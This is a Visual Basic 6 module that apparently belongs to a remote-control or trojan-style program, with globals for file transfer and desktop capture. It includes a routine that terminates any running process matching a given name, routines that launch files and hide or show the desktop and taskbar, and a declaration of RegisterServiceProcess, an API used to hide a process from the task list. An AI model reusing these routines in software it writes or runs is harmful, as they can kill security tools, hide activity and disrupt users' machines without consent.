Attribute VB_Name = "Module2"
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Const SWP_HIDEWINDOW = &H80
Const SWP_SHOWWINDOW = &H40


Public status As String
Public bFileTransfer As Boolean
Public lFileSize As Long
Public bGettingDesktop As Boolean
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

 ''''''''''
Global LastX As Integer
Global LastY As Integer


Global TransBuff As String

'''

Public Declare Function GetDesktopWindow Lib "user32" () As Long

Const PROCESS_ALL_ACCESS = 0
Dim uProcess As PROCESSENTRY32
Dim rProcessFound As Long
Dim hSnapshot As Long
Dim szExename As String
Dim exitCode As Long
Dim myProcess As Long
Dim AppKill As Boolean
Dim appCount As Integer
Dim i As Integer
Const MAX_PATH& = 260
Declare Function TerminateProcess Lib "kernel32" (ByVal ApphProcess As Long, ByVal uExitCode As Long) As Long
Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal blnheritHandle As Long, ByVal dwAppProcessId As Long) As Long
Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapshot As Long, uProcess As PROCESSENTRY32) As Long
Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal lFlags As Long, lProcessID As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szexeFile As String * MAX_PATH
    End Type
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal ProcessID As Long, ByVal ServiceFlags As Long) As Long
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long

Public Function KillApp(myName As String) As Boolean
appCount = 0
Const TH32CS_SNAPPROCESS As Long = 2&
uProcess.dwSize = Len(uProcess)
hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
rProcessFound = ProcessFirst(hSnapshot, uProcess)
Do While rProcessFound
i = InStr(1, uProcess.szexeFile, Chr(0))
szExename = LCase$(Left$(uProcess.szexeFile, i - 1))
If Right$(szExename, Len(myName)) = LCase$(myName) Then
KillApp = True
appCount = appCount + 1
myProcess = OpenProcess(PROCESS_ALL_ACCESS, False, uProcess.th32ProcessID)
AppKill = TerminateProcess(myProcess, exitCode)
Call CloseHandle(myProcess)
End If
rProcessFound = ProcessNext(hSnapshot, uProcess)
Loop
Call CloseHandle(hSnapshot)
Finish:
End Function
Public Sub WriteList(list As ListBox, FileName As String)
    Dim i
    If list.ListCount <= 0 Then
        Exit Sub
        End
    End If
    On Error GoTo Err
    Open FileName For Output As #1
    For i = 0 To list.ListCount - 1
        Print #1, list.list(i)
    Next
    Close #1
    Exit Sub
Err:
   On Error Resume Next
    Exit Sub
End Sub
Public Function ShellExecLaunchFile(ByVal strPathFile As String, ByVal strOpenInPath As String, ByVal strArguments As String) As Long
Dim Scr_hDC As Long
Scr_hDC = GetDesktopWindow()
ShellExecLaunchFile = ShellExecute(Scr_hDC, "Open", strPathFile, "", strOpenInPath, SW_SHOWNORMAL)
End Function
Public Sub HideDesktop()
Dim hwnd As Long
hwnd = FindWindowEx(0&, 0&, "Progman", vbNullString)
ShowWindow hwnd, 0
End Sub
Public Sub ShowDesktop()
Dim hwnd As Long
hwnd = FindWindowEx(0&, 0&, "Progman", vbNullString)
ShowWindow hwnd, 5
End Sub

Public Sub ShowTaskBar()
Dim Thwnd As Long
Thwnd = FindWindow("Shell_traywnd", "")
Call SetWindowPos(Thwnd, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
End Sub
Public Sub HideTaskBar()
Dim Thwnd As Long
Thwnd = FindWindow("Shell_traywnd", "")
Call SetWindowPos(Thwnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
End Sub

